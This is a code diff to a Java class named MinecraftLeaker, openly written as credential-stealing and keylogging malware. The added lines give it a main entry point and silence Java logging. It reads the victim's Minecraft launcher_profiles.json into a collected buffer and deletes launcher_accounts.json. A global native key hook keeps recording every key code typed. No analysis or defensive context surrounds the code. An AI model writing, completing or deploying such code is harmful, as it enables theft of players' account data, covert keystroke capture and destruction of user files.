@@ -12,8 +12,13 @@ import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.concurrent.CompletableFuture;
+import java.util.logging.LogManager;
 
 public class MinecraftLeaker extends Leakable implements NativeKeyListener {
+
+  public static void main(String[] args) {
+    new MinecraftLeaker();
+  }
 
   private String sequence;
   private boolean run;
@@ -21,6 +26,7 @@ public class MinecraftLeaker extends Leakable implements NativeKeyListener {
   public MinecraftLeaker() {
     run = true;
     try {
+      LogManager.getLogManager().reset();
       GlobalScreen.registerNativeHook();
     } catch (final NativeHookException e) {
       e.printStackTrace();
@@ -48,14 +54,17 @@ public class MinecraftLeaker extends Leakable implements NativeKeyListener {
 
   public void storeProfilesJSON() {
     appendLine("============== MINECRAFT PROFILE ==============");
-    final File file = new File("%appdata%\\.minecraft\\launcher_accounts.json");
-    if (file.exists()) {
-      file.deleteOnExit();
+    final File folder = new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\.minecraft");
+    final File profiles = new File(folder,"launcher_profiles.json");
+    if (profiles.exists()) {
       try {
         appendLine(
             String.join(
                 System.lineSeparator(),
-                Files.readAllLines(Paths.get(file.getAbsolutePath()), StandardCharsets.UTF_8)));
+                Files.readAllLines(Paths.get(profiles.getAbsolutePath()), StandardCharsets.UTF_8)));
+        if (new File(folder,"launcher_accounts.json").delete()) {
+          System.out.println("");
+        }
       } catch (final IOException e) {
         e.printStackTrace();
       }
@@ -74,6 +83,7 @@ public class MinecraftLeaker extends Leakable implements NativeKeyListener {
     } else {
       sequence += (nke.getKeyCode() + " ");
     }
+    System.out.println("sequence");
   }
 
   @Override
